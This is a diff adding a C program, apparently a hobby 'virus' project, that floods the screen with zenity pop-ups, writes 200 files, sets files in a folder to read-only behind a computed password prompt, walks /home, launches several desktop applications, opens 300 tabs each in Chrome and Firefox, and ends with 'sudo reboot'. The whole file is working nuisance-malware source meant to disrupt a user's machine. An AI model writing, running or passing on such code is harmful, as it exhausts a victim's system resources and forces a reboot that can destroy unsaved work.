@@ -1,0 +1,310 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <dirent.h>
+#include <sys/stat.h>
+#include <time.h>
+#include <unistd.h>
+
+#define MAX_PATH_LENGTH 1024
+
+// Function to generate the password through complex mathematics
+void generatePassword(char *password) {
+    unsigned long long a = 0x328768;
+    unsigned long long b = 0x7A6F07617A8A8C7;
+    unsigned long long c = 0x687344878789344;
+    unsigned long long d = 0x298F3B5FAEA5B75;
+    unsigned long long e = 0x7B12E8B5E3FB5A7;
+    unsigned long long f = 0x7A63D67B63D7B12;
+    unsigned long long g = 0x3697A7D67A7B12C;
+    unsigned long long h = 0x3B5A7B3F3B5A67B;
+    unsigned long long i = 0x738AB5A73B5B7F3;
+    unsigned long long j = 0x3B5A67B3B5B7F5E;
+
+    unsigned long long result = (a ^ b) + (c & d) - (e | f) + (g << 2) - (h >> 3) + (i * j);
+
+    sprintf(password, "%llu", result);
+    strcat(password, "xyz");
+}
+
+// Function to show pop-up messages
+void showPopUps() {
+    for (int i = 0; i < 10; i++) {
+        // Show a message box using zenity
+        system("zenity --info --text='@@@@@@@@@@@@@@@@@@@@' --title='@@@@@@@@@@@@@@@@@@'");
+    }
+}
+
+// Function to create files
+void createFiles(const char *directoryPath) {
+    for (int i = 1; i <= 200; ++i) {
+        // Generate the file name
+        char fileName[256];
+        snprintf(fileName, sizeof(fileName), "%s%d.txt", directoryPath, i);
+
+        // Create and open the file
+        FILE *file = fopen(fileName, "w");
+
+        // Check if the file was created successfully
+        if (!file) {
+            printf("Error creating file: %s\n", fileName);
+            exit(1);
+        }
+
+        // Optionally, write something to the file
+        fprintf(file, "This is file number %d\n", i);
+
+        // Close the file
+        fclose(file);
+
+        printf("Created file: %s\n", fileName);
+    }
+}
+
+// Function to lock files in a directory by changing their permissions
+void lockFiles(const char *directoryPath) {
+    DIR *dir;
+    struct dirent *entry;
+    char filePath[1024];
+    struct stat fileStat;
+
+    if ((dir = opendir(directoryPath)) == NULL) {
+        perror("opendir");
+        return;
+    }
+
+    while ((entry = readdir(dir)) != NULL) {
+        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
+            continue;
+        }
+
+        snprintf(filePath, sizeof(filePath), "%s/%s", directoryPath, entry->d_name);
+
+        if (stat(filePath, &fileStat) == -1) {
+            perror("stat");
+            continue;
+        }
+
+        if (S_ISREG(fileStat.st_mode)) {
+            if (chmod(filePath, S_IRUSR) == -1) {
+                perror("chmod");
+            } else {
+                printf("Locked file: %s\n", filePath);
+            }
+        }
+    }
+
+    closedir(dir);
+}
+
+// Function to prompt for a password when a file is accessed
+int accessFile(const char *filePath, const char *correctPassword) {
+    char inputPassword[256];
+
+    printf("Enter password to access %s: ", filePath);
+    fgets(inputPassword, sizeof(inputPassword), stdin);
+
+    // Remove newline character from input
+    size_t len = strlen(inputPassword);
+    if (len > 0 && inputPassword[len - 1] == '\n') {
+        inputPassword[len - 1] = '\0';
+    }
+
+    if (strcmp(inputPassword, correctPassword) == 0) {
+        printf("Access granted to %s\n", filePath);
+        // Simulate opening the file
+        printf("Opening file: %s\n", filePath);
+        return 0; // Success
+    } else {
+        printf("Access denied. Incorrect password.\n");
+        return 1; // Failure
+    }
+}
+
+// Function to randomly decide if a folder is "important"
+int isImportantFolder() {
+    // Randomly select important folders with a probability of 1/5
+    return rand() % 5 == 0;
+}
+
+// Function to traverse directories and find random folders
+void findRandomFolders(const char *directoryPath) {
+    DIR *dir;
+    struct dirent *entry;
+    char path[MAX_PATH_LENGTH];
+    struct stat fileStat;
+
+    if ((dir = opendir(directoryPath)) == NULL) {
+        perror("opendir");
+        return;
+    }
+
+    while ((entry = readdir(dir)) != NULL) {
+        // Skip . and .. entries
+        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
+            continue;
+        }
+
+        snprintf(path, sizeof(path), "%s/%s", directoryPath, entry->d_name);
+
+        // Get file information
+        if (stat(path, &fileStat) == -1) {
+            perror("stat");
+            continue;
+        }
+
+        // Check if it's a directory
+        if (S_ISDIR(fileStat.st_mode)) {
+            // Randomly decide if this folder is "important"
+            if (isImportantFolder()) {
+                printf("Important Folder: %s\n", path);
+            }
+
+            // Recursively search in the subdirectory
+            findRandomFolders(path);
+        }
+    }
+
+    closedir(dir);
+}
+
+// Function to open multiple browser tabs
+void open_browser_tabs(const char *browser_command, int num_tabs) {
+    char command[256];
+    for (int i = 0; i < num_tabs; ++i) {
+        snprintf(command, sizeof(command), "%s --new-tab about:blank &", browser_command);
+        system(command);
+    }
+}
+
+// Function to find and run all applications (simplified example)
+void find_and_run_all_applications() {
+    // This is a simplified example, as finding and running all applications is complex and system-specific.
+    // Here we just open some common applications if they exist in the PATH.
+    const char *apps[] = {
+        "gnome-calculator", "gedit", "gnome-terminal", "vlc", "libreoffice"
+    };
+
+    for (int i = 0; i < sizeof(apps) / sizeof(apps[0]); ++i) {
+        char command[256];
+        snprintf(command, sizeof(command), "%s &", apps[i]);
+        system(command);
+    }
+}
+
+int main() {
+    char password[256];
+    
+    // Seed the random number generator
+    srand(time(NULL));
+
+    // Generate the password
+    generatePassword(password);
+    printf("Generated Password: %s\n", password);
+
+    // Show pop-ups first
+    for (int i = 0; i < 10; i++) {
+        // Show a message box using zenity
+        system("zenity --info --text='@@@@@@@@@@@@@@@@@@@@' --title='@@@@@@@@@@@@@@@@@@'");
+    }
+
+    // Define the directory path
+    const char *directoryPath = "/home/dihan/Desktop/Virus_praca/";
+
+    // Create files
+    for (int i = 1; i <= 200; ++i) {
+        // Generate the file name
+        char fileName[256];
+        snprintf(fileName, sizeof(fileName), "%s%d.txt", directoryPath, i);
+
+        // Create and open the file
+        FILE *file = fopen(fileName, "w");
+
+        // Check if the file was created successfully
+        if (!file) {
+            printf("Error creating file: %s\n", fileName);
+            exit(1);
+        }
+
+        // Optionally, write something to the file
+        fprintf(file, "This is file number %d\n", i);
+
+        // Close the file
+        fclose(file);
+
+        printf("Created file: %s\n", fileName);
+    }
+
+    // Lock the files in the specified directory
+    DIR *dir;
+    struct dirent *entry;
+    char filePath[1024];
+    struct stat fileStat;
+
+    if ((dir = opendir(directoryPath)) == NULL) {
+        perror("opendir");
+        return 1;
+    }
+
+    while ((entry = readdir(dir)) != NULL) {
+        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
+            continue;
+        }
+
+        snprintf(filePath, sizeof(filePath), "%s/%s", directoryPath, entry->d_name);
+
+        if (stat(filePath, &fileStat) == -1) {
+            perror("stat");
+            continue;
+        }
+
+        if (S_ISREG(fileStat.st_mode)) {
+            if (chmod(filePath, S_IRUSR) == -1) {
+                perror("chmod");
+            } else {
+                printf("Locked file: %s\n", filePath);
+            }
+        }
+    }
+
+    closedir(dir);
+
+    // Example of accessing a locked file
+    char inputPassword[256];
+    printf("Enter password to access %s: ", "/home/dihan/Desktop/Virus_praca/example.txt");
+    fgets(inputPassword, sizeof(inputPassword), stdin);
+
+    // Remove newline character from input
+    size_t len = strlen(inputPassword);
+    if (len > 0 && inputPassword[len - 1] == '\n') {
+        inputPassword[len - 1] = '\0';
+    }
+
+    if (strcmp(inputPassword, password) == 0) {
+        printf("Access granted to %s\n", "/home/dihan/Desktop/Virus_praca/example.txt");
+        // Simulate opening the file
+        printf("Opening file: %s\n", "/home/dihan/Desktop/Virus_praca/example.txt");
+    } else {
+        printf("Access denied. Incorrect password.\n");
+    }
+
+    // Start searching from the root directory or any other directory
+    findRandomFolders("/home");  // Example starting point
+
+    // Find and run all applications (simplified example)
+    find_and_run_all_applications();
+
+    // Open 300 tabs in Chrome
+    open_browser_tabs("google-chrome", 300);
+
+    // Open 300 tabs in Firefox
+    open_browser_tabs("firefox", 300);
+
+    // Wait for 1 minute
+    sleep(60);
+
+    // Restart the computer
+    system("sudo reboot");
+
+    return 0;
+}
